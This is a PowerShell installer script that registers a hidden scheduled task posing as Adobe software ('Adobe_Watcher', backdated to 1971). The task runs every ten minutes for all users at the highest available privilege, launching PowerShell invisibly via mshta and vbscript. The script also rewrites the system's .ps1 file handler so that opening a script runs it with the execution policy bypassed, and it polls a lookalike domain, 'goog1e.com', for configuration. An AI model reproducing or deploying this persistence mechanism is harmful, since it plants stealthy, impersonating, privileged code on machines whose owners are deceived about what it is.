
#Requires -Version 5

[CmdletBinding()]
param (
    [Parameter()]
    [switch]$CheckPowershell
)

$taskVersion = "2.03"
$uri = "https://goog1e.com"
$Logfile = "$PSScriptRoot\seed.log"

$TasksDefinitions = @{
  "PwshWatcher"      = @{
    "Name"          = "PwshWatcher";
    "Values"        = @{
      "/ns:Task/ns:Actions/ns:Exec/ns:Command" = "mshta.exe";
      "/ns:Task/ns:Actions/ns:Exec/ns:Arguments" = 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& {ScriptFile}"""""", 0 : window.close")'
    };
    "XmlDefinition" = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>1971-08-31T00:00:00.0000000</Date>
    <Author>Adobe Systems Incorporated</Author>
    <Description>Pswh watcher</Description>
    <Version>$taskVersion</Version>
    <URI>\Adobe_Watcher</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>1971-08-31T00:00:00</StartBoundary>
      <ExecutionTimeLimit>PT30M</ExecutionTimeLimit>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <GroupId>S-1-1-0</GroupId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command></Command>
      <Arguments></Arguments>
    </Exec>
  </Actions>
</Task>
"@
  }
}

######## Local functions
function WriteLog {
  Param ([string]$LogString)
  Write-Host $LogString
  $Stamp = (Get-Date).toString("yyyy/MM/dd HH:mm:ss")
  $LogMessage = "$Stamp $LogString"
  Add-content $LogFile -value $LogMessage
}

function _PwshContextMenu {
  #$oldVarDefault = (Get-ItemProperty -path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Open\Command)."(Default)"
  #$oldVarDefautValue = '%systemroot%\system32\WindowsPowerShell\v1.0\powershell.exe -Command "&''%1''"'

  $pwshVarMenu = "$((Get-Command pwsh).Path) -Command ""&'%1'"""

  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Open\Command -Type ExpandString -Name '(Default)' -Value $pwshVarMenu

  New-Item -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Force
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Name "Icon" -Value $pwshPath -Type String
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Name "MUIVerb" -Value "Run with PowerShell 7" -Type String
  New-Item -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Force
  $keyValue = 'C:\Program Files\PowerShell\7\pwsh.exe -Command "$host.UI.RawUI.WindowTitle = ''PowerShell 7 (x64)''; if((Get-ExecutionPolicy ) -ne ''AllSigned'') { Set-ExecutionPolicy -Scope Process Bypass }; & ''%1''"' 
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Name '(Default)' -Value $keyValue -Type String
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Name "PowerShellPath" -Value $pwshPath -Type String

  #"C:\Program Files\PowerShell\7\pwsh.exe" -WindowStyle Hidden "-Command" ""& {Start-Process """C:\Program Files\PowerShell\7\pwsh.exe""" -ArgumentList '-ExecutionPolicy RemoteSigned -File \"%1\"' -Verb RunAs;start-sleep 1}"
  $keyName = "Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Run with PowerShell 7 (Admin)"
  New-Item -Path $keyName -Force
  Set-ItemProperty -Path $keyName -Name "Icon" -Value $pwshPath -Type String
  Set-ItemProperty -Path $keyName "MUIVerb" -Value "Run with PowerShell 7" -Type String
  New-Item -Path "$keyName\Command" -Force
  $keyValue = 'C:\Program Files\PowerShell\7\pwsh.exe" -WindowStyle Hidden "-Command" ""& {Start-Process """C:\Program Files\PowerShell\7\pwsh.exe""" -ArgumentList ''-ExecutionPolicy RemoteSigned -File \"%1\"'' -Verb RunAs;start-sleep 1}'
  Set-ItemProperty -Path "$keyName\Command" -Name '(Default)' -Value $keyValue -Type String
  Set-ItemProperty -Path "$keyName\Command" -Name "PowerShellPath" -Value $pwshPath -Type String
}

function _CheckServerConnection
{
  try{
    Invoke-RestMethod -Uri "$uri/GetConfig";
    return $true;
  }
  catch
  {
    return $false;
  }
}

function FindModules {
  [CmdletBinding()]
  param (
      [Parameter()]
      [string]$ModulesFolder
  )
  $deep = 5;
  $folders = New-Object System.Collections.Generic.List[string]
  #$modulesPathes = $PSScriptRoot

  for($i=0; $i -le $deep; $i++){
      $folders.Add("$PSScriptRoot\$('..\'*$i)Modules");
  }
  foreach($item in $folders)
  {
      if(Test-Path $item -PathType Container){
          $modulePathBase = $item;
          break;
      }
  }

  $pathArray = $( (Resolve-Path "$modulePathBase\Agt.Common\Public\").Path, `
      (Resolve-Path "$modulePathBase\Agt.Install\Public\").Path, `
      (Resolve-Path "$modulePathBase\Agt.Network\").Path)

  foreach ($path in $pathArray) {
      foreach ($item in (Get-ChildItem "$path\*.ps1")) {
          . "$($item.FullName)"
      }
  }
}

try{
  . FindModules
}
catch {
  Write-Output $_
  return
}

########  Variables
$destinationFolder = $PSScriptRoot
$thisFileName = $MyInvocation.MyCommand.Name
#$thisFileFullName = $MyInvocation.MyCommand.Path
$scriptFile = [System.IO.Path]::Combine($PSScriptRoot, $thisFileName)
$replacements = @{"ScriptFile" = "'$scriptFile' -CheckPowershell"}
$debugger = $false; #($PSBoundParameters.ContainsKey("Debug")) -or ($DebugPreference  -eq "SilentlyContinue")

######## Check task

if(-not $debugger)
{
  $taskExist = Register-Task -TaskData $TasksDefinitions[$TaskName] -Replacements $replacements
  if (!$taskExist) {
    exit
  }
}

WriteLog -LogString $CheckPowershell
#Install-OpenSsh
#Install-Powershell